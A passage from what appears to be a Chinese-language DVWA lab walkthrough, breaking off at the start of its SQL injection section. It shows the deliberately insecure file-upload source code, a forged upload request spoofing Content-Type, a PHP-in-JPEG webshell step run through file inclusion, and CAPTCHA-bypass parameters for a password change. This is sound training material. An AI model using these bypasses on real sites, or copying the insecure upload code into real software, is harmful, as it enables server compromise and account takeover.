class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//File Upload</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//Impossible File Upload Source</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>( <span class=\"keyword\">isset</span>( <span class=\"variable\">$_POST</span>[ <span class=\"string\">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// Check Anti-CSRF token</span></span><br><span class=\"line\">    checkToken( <span class=\"variable\">$_REQUEST</span>[ <span class=\"string\">&#x27;user_token&#x27;</span> ], <span class=\"variable\">$_SESSION</span>[ <span class=\"string\">&#x27;session_token&#x27;</span> ], <span class=\"string\">&#x27;index.php&#x27;</span> );</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// File information</span></span><br><span class=\"line\">    <span class=\"variable\">$uploaded_name</span> = <span class=\"variable\">$_FILES</span>[ <span class=\"string\">&#x27;uploaded&#x27;</span> ][ <span class=\"string\">&#x27;name&#x27;</span> ];</span><br><span class=\"line\">    <span class=\"variable\">$uploaded_ext</span>  = substr( <span class=\"variable\">$uploaded_name</span>, strrpos( <span class=\"variable\">$uploaded_name</span>, <span class=\"string\">&#x27;.&#x27;</span> ) + <span class=\"number\">1</span>);</span><br><span class=\"line\">    <span class=\"variable\">$uploaded_size</span> = <span class=\"variable\">$_FILES</span>[ <span class=\"string\">&#x27;uploaded&#x27;</span> ][ <span class=\"string\">&#x27;size&#x27;</span> ];</span><br><span class=\"line\">    <span class=\"variable\">$uploaded_type</span> = <span class=\"variable\">$_FILES</span>[ <span class=\"string\">&#x27;uploaded&#x27;</span> ][ <span class=\"string\">&#x27;type&#x27;</span> ];</span><br><span class=\"line\">    <span class=\"variable\">$uploaded_tmp</span>  = <span class=\"variable\">$_FILES</span>[ <span class=\"string\">&#x27;uploaded&#x27;</span> ][ <span class=\"string\">&#x27;tmp_name&#x27;</span> ];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Where are we going to be writing to?</span></span><br><span class=\"line\">    <span class=\"variable\">$target_path</span>   = DVWA_WEB_PAGE_TO_ROOT . <span class=\"string\">&#x27;hackable/uploads/&#x27;</span>;</span><br><span class=\"line\">    <span class=\"comment\">//$target_file   = basename( $uploaded_name, &#x27;.&#x27; . $uploaded_ext ) . &#x27;-&#x27;;</span></span><br><span class=\"line\">    <span class=\"variable\">$target_file</span>   =  md5( uniqid() . <span class=\"variable\">$uploaded_name</span> ) . <span class=\"string\">&#x27;.&#x27;</span> . <span class=\"variable\">$uploaded_ext</span>;</span><br><span class=\"line\">    <span class=\"variable\">$temp_file</span>     = ( ( ini_get( <span class=\"string\">&#x27;upload_tmp_dir&#x27;</span> ) == <span class=\"string\">&#x27;&#x27;</span> ) ? ( sys_get_temp_dir() ) : ( ini_get( <span class=\"string\">&#x27;upload_tmp_dir&#x27;</span> ) ) );</span><br><span class=\"line\">    <span class=\"variable\">$temp_file</span>    .= DIRECTORY_SEPARATOR . md5( uniqid() . <span class=\"variable\">$uploaded_name</span> ) . <span class=\"string\">&#x27;.&#x27;</span> . <span class=\"variable\">$uploaded_ext</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Is it an image?</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>( ( strtolower( <span class=\"variable\">$uploaded_ext</span> ) == <span class=\"string\">&#x27;jpg&#x27;</span> || strtolower( <span class=\"variable\">$uploaded_ext</span> ) == <span class=\"string\">&#x27;jpeg&#x27;</span> || strtolower( <span class=\"variable\">$uploaded_ext</span> ) == <span class=\"string\">&#x27;png&#x27;</span> ) &amp;&amp;</span><br><span class=\"line\">        ( <span class=\"variable\">$uploaded_size</span> &lt; <span class=\"number\">100000</span> ) &amp;&amp;</span><br><span class=\"line\">        ( <span class=\"variable\">$uploaded_type</span> == <span class=\"string\">&#x27;image/jpeg&#x27;</span> || <span class=\"variable\">$uploaded_type</span> == <span class=\"string\">&#x27;image/png&#x27;</span> ) &amp;&amp;</span><br><span class=\"line\">        getimagesize( <span class=\"variable\">$uploaded_tmp</span> ) ) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD)</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>( <span class=\"variable\">$uploaded_type</span> == <span class=\"string\">&#x27;image/jpeg&#x27;</span> ) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$img</span> = imagecreatefromjpeg( <span class=\"variable\">$uploaded_tmp</span> );</span><br><span class=\"line\">            imagejpeg( <span class=\"variable\">$img</span>, <span class=\"variable\">$temp_file</span>, <span class=\"number\">100</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$img</span> = imagecreatefrompng( <span class=\"variable\">$uploaded_tmp</span> );</span><br><span class=\"line\">            imagepng( <span class=\"variable\">$img</span>, <span class=\"variable\">$temp_file</span>, <span class=\"number\">9</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        imagedestroy( <span class=\"variable\">$img</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// Can we move the file to the web root from the temp folder?</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>( rename( <span class=\"variable\">$temp_file</span>, ( getcwd() . DIRECTORY_SEPARATOR . <span class=\"variable\">$target_path</span> . <span class=\"variable\">$target_file</span> ) ) ) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// Yes!</span></span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;pre&gt;&lt;a href=&#x27;$&#123;target_path&#125;$&#123;target_file&#125;&#x27;&gt;$&#123;target_file&#125;&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">// No</span></span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// Delete any temp files</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>( file_exists( <span class=\"variable\">$temp_file</span> ) )</span><br><span class=\"line\">            unlink( <span class=\"variable\">$temp_file</span> );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// Invalid file</span></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Generate Anti-CSRF token</span></span><br><span class=\"line\">generateSessionToken();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//High File Upload Source</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>( <span class=\"keyword\">isset</span>( <span class=\"variable\">$_POST</span>[ <span class=\"string\">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// Where are we going to be writing to?</span></span><br><span class=\"line\">    <span class=\"variable\">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class=\"string\">&quot;hackable/uploads/&quot;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$target_path</span> .= basename( <span class=\"variable\">$_FILES</span>[ <span class=\"string\">&#x27;uploaded&#x27;</span> ][ <span class=\"string\">&#x27;name&#x27;</span> ] );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// File information</span></span><br><span class=\"line\">    <span class=\"variable\">$uploaded_name</span> = <span class=\"variable\">$_FILES</span>[ <span class=\"string\">&#x27;uploaded&#x27;</span> ][ <span class=\"string\">&#x27;name&#x27;</span> ];</span><br><span class=\"line\">    <span class=\"variable\">$uploaded_ext</span>  = substr( <span class=\"variable\">$uploaded_name</span>, strrpos( <span class=\"variable\">$uploaded_name</span>, <span class=\"string\">&#x27;.&#x27;</span> ) + <span class=\"number\">1</span>);</span><br><span class=\"line\">    <span class=\"variable\">$uploaded_size</span> = <span class=\"variable\">$_FILES</span>[ <span class=\"string\">&#x27;uploaded&#x27;</span> ][ <span class=\"string\">&#x27;size&#x27;</span> ];</span><br><span class=\"line\">    <span class=\"variable\">$uploaded_tmp</span>  = <span class=\"variable\">$_FILES</span>[ <span class=\"string\">&#x27;uploaded&#x27;</span> ][ <span class=\"string\">&#x27;tmp_name&#x27;</span> ];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Is it an image?</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>( ( strtolower( <span class=\"variable\">$uploaded_ext</span> ) == <span class=\"string\">&quot;jpg&quot;</span> || strtolower( <span class=\"variable\">$uploaded_ext</span> ) == <span class=\"string\">&quot;jpeg&quot;</span> || strtolower( <span class=\"variable\">$uploaded_ext</span> ) == <span class=\"string\">&quot;png&quot;</span> ) &amp;&amp;</span><br><span class=\"line\">        ( <span class=\"variable\">$uploaded_size</span> &lt; <span class=\"number\">100000</span> ) &amp;&amp;</span><br><span class=\"line\">        getimagesize( <span class=\"variable\">$uploaded_tmp</span> ) ) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// Can we move the file to the upload folder?</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>( !move_uploaded_file( <span class=\"variable\">$uploaded_tmp</span>, <span class=\"variable\">$target_path</span> ) ) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// No</span></span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">// Yes!</span></span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;pre&gt;<span class=\"subst\">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// Invalid file</span></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//Medium File Upload Source</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>( <span class=\"keyword\">isset</span>( <span class=\"variable\">$_POST</span>[ <span class=\"string\">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// Where are we going to be writing to?</span></span><br><span class=\"line\">    <span class=\"variable\">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class=\"string\">&quot;hackable/uploads/&quot;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$target_path</span> .= basename( <span class=\"variable\">$_FILES</span>[ <span class=\"string\">&#x27;uploaded&#x27;</span> ][ <span class=\"string\">&#x27;name&#x27;</span> ] );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// File information</span></span><br><span class=\"line\">    <span class=\"variable\">$uploaded_name</span> = <span class=\"variable\">$_FILES</span>[ <span class=\"string\">&#x27;uploaded&#x27;</span> ][ <span class=\"string\">&#x27;name&#x27;</span> ];</span><br><span class=\"line\">    <span class=\"variable\">$uploaded_type</span> = <span class=\"variable\">$_FILES</span>[ <span class=\"string\">&#x27;uploaded&#x27;</span> ][ <span class=\"string\">&#x27;type&#x27;</span> ];</span><br><span class=\"line\">    <span class=\"variable\">$uploaded_size</span> = <span class=\"variable\">$_FILES</span>[ <span class=\"string\">&#x27;uploaded&#x27;</span> ][ <span class=\"string\">&#x27;size&#x27;</span> ];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Is it an image?</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>( ( <span class=\"variable\">$uploaded_type</span> == <span class=\"string\">&quot;image/jpeg&quot;</span> || <span class=\"variable\">$uploaded_type</span> == <span class=\"string\">&quot;image/png&quot;</span> ) &amp;&amp;</span><br><span class=\"line\">        ( <span class=\"variable\">$uploaded_size</span> &lt; <span class=\"number\">100000</span> ) ) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// Can we move the file to the upload folder?</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>( !move_uploaded_file( <span class=\"variable\">$_FILES</span>[ <span class=\"string\">&#x27;uploaded&#x27;</span> ][ <span class=\"string\">&#x27;tmp_name&#x27;</span> ], <span class=\"variable\">$target_path</span> ) ) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// No</span></span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">// Yes!</span></span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;pre&gt;<span class=\"subst\">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// Invalid file</span></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//Low File Upload Source</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>( <span class=\"keyword\">isset</span>( <span class=\"variable\">$_POST</span>[ <span class=\"string\">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// Where are we going to be writing to?</span></span><br><span class=\"line\">    <span class=\"variable\">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class=\"string\">&quot;hackable/uploads/&quot;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$target_path</span> .= basename( <span class=\"variable\">$_FILES</span>[ <span class=\"string\">&#x27;uploaded&#x27;</span> ][ <span class=\"string\">&#x27;name&#x27;</span> ] );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Can we move the file to the upload folder?</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>( !move_uploaded_file( <span class=\"variable\">$_FILES</span>[ <span class=\"string\">&#x27;uploaded&#x27;</span> ][ <span class=\"string\">&#x27;tmp_name&#x27;</span> ], <span class=\"variable\">$target_path</span> ) ) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// No</span></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// Yes!</span></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;pre&gt;<span class=\"subst\">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"low-5\"><a class=\"markdownIt-Anchor\" href=\"#low-5\">#</a> Low</h3>\n<ul>\n<li>随便上传，无限制</li>\n</ul>\n<h3 id=\"medium-5\"><a class=\"markdownIt-Anchor\" href=\"#medium-5\">#</a> Medium</h3>\n<ul>\n<li>限制文件类型，但是可以改包上传 Content-Type: image/png</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /dvwa/vulnerabilities/upload/ HTTP/1.1</span><br><span class=\"line\"></span><br><span class=\"line\">Host: 192.168.23.133</span><br><span class=\"line\"></span><br><span class=\"line\">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class=\"line\"></span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class=\"line\"></span><br><span class=\"line\">Accept-Language: en-US,en;q=0.5</span><br><span class=\"line\"></span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\"></span><br><span class=\"line\">Content-Type: multipart/form-data; boundary=---------------------------24238774263872546046514723521</span><br><span class=\"line\"></span><br><span class=\"line\">Content-Length: 977</span><br><span class=\"line\"></span><br><span class=\"line\">Origin: http://192.168.23.133</span><br><span class=\"line\"></span><br><span class=\"line\">Connection: close</span><br><span class=\"line\"></span><br><span class=\"line\">Referer: http://192.168.23.133/dvwa/vulnerabilities/upload/</span><br><span class=\"line\"></span><br><span class=\"line\">Cookie: security=low; PHPSESSID=otpvh75rdm983qnfc0scstgns0</span><br><span class=\"line\"></span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">-----------------------------24238774263872546046514723521</span><br><span class=\"line\"></span><br><span class=\"line\">Content-Disposition: form-data; name=&quot;MAX_FILE_SIZE&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">100000</span><br><span class=\"line\"></span><br><span class=\"line\">-----------------------------24238774263872546046514723521</span><br><span class=\"line\"></span><br><span class=\"line\">Content-Disposition: form-data; name=&quot;uploaded&quot;; filename=&quot;a.txt&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">Content-Type: image/png</span><br></pre></td></tr></table></figure>\n<ul>\n<li>txt 上传成功</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">../../hackable/uploads/a.txt succesfully uploaded!</span><br></pre></td></tr></table></figure>\n<h3 id=\"high-5\"><a class=\"markdownIt-Anchor\" href=\"#high-5\">#</a> High</h3>\n<ul>\n<li>加入内容检测和文件类型检测</li>\n<li>通过在图片中加入一句话木马实现上传</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo &quot;&lt;? phpinfo() ?&gt;&quot; &gt;&gt;th.jpeg </span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">../../hackable/uploads/th.jpeg succesfully uploaded!</span><br></pre></td></tr></table></figure>\n<ul>\n<li>通过文件包含漏洞解析上传图片</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?page=file:///var/www/html/dvwa//hackable/uploads/th.jpeg</span><br></pre></td></tr></table></figure>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210427184134233.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"image-20210427184134233\"></p>\n<h2 id=\"insecure-captcha\"><a class=\"markdownIt-Anchor\" href=\"#insecure-captcha\">#</a> Insecure CAPTCHA</h2>\n<h3 id=\"low-6\"><a class=\"markdownIt-Anchor\" href=\"#low-6\">#</a> Low</h3>\n<ul>\n<li>修改包的参数 step=2 即可。</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">step=2&amp;password_new=123&amp;password_conf=123&amp;Change=Change</span><br><span class=\"line\"></span><br><span class=\"line\">Password Changed.</span><br></pre></td></tr></table></figure>\n<h3 id=\"medium-6\"><a class=\"markdownIt-Anchor\" href=\"#medium-6\">#</a> Medium</h3>\n<ul>\n<li>修改包的参数 step=2。</li>\n<li>查看源码得知新变量 passed_captcha，谷歌返回情况，将其 POST 为 true。</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">step=2&amp;password_new=123&amp;password_conf=123&amp;Change=Change&amp;passed_captcha=true</span><br></pre></td></tr></table></figure>\n<h3 id=\"high-6\"><a class=\"markdownIt-Anchor\" href=\"#high-6\">#</a> High</h3>\n<ul>\n<li>添加如下信息至包中</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">User-Agent: reCAPTCHA</span><br><span class=\"line\">step=1&amp;password_new=123&amp;password_conf=123&amp;user_token=2143b157158c8dce48d7b94d045bad71&amp;Change=Change&amp;g-recaptcha-response=hidd3n_valu3</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"sql-injection\"><a class=\"markdownIt-Anchor\" href=\"#sql-injection\">#</a> SQL Injection</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//SQL Injection</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//Impossible SQL Injection Source</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>( <span class=\"keyword\">isset</span>( <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// Check Anti-CSRF token</span></span><br><span class=\"line\">    checkToken( <span class=\"variable\">$_REQUEST</span>[ <span class=\"string\">&#x27;user_token&#x27;</span> ], <span class=\"variable\">$_SESSION</span>[ <span class=\"string\">&#x27;session_token&#x27;</span> ], <span class=\"string\">&#x27;index.php&#x27;</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Get input</span></span><br><span class=\"line\">    <span class=\"variable\">$id</span> = <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;id&#x27;</span> ];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Was a number entered?</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(is_numeric( <span class=\"variable\">$id</span> )) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// Check the database</span></span><br><span class=\"line\">        <span class=\"variable\">$data</span> = <span class=\"variable\">$db</span>-&gt;prepare( <span class=\"string\">&#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27;</span> );</span><br><span class=\"line\">        <span 